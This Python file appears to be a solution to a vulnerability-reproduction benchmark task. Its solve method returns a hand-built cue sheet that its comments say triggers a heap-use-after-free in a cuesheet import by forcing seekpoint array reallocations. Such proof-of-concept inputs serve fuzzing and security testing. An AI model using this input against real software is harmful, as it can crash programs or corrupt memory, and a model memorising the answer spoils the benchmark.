import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Cue sheet format that triggers heap-use-after-free in import cuesheet operation
        # after appending seekpoints. The structure causes realloc of seekpoints array
        # while keeping old pointer in handle.
        
        # Build a cuesheet with multiple FILE and TRACK entries that will cause
        # repeated reallocations of the seekpoints array
        poc = b"""FILE "dummy1.wav" WAVE
  TRACK 01 AUDIO
    INDEX 01 00:00:00
FILE "dummy2.wav" WAVE
  TRACK 01 AUDIO
    INDEX 01 00:00:00
    INDEX 02 00:01:00
FILE "dummy3.wav" WAVE
  TRACK 01 AUDIO
    INDEX 01 00:00:00
    INDEX 02 00:01:00
    INDEX 03 00:02:00
FILE "dummy4.wav" WAVE
  TRACK 01 AUDIO
    INDEX 01 00:00:00
    INDEX 02 00:01:00
    INDEX 03 00:02:00
    INDEX 04 00:03:00
FILE "dummy5.wav" WAVE
  TRACK 01 AUDIO
    INDEX 01 00:00:00
    INDEX 02 00:01:00
    INDEX 03 00:02:00
    INDEX 04 00:03:00
    INDEX 05 00:04:00
"""
        return poc
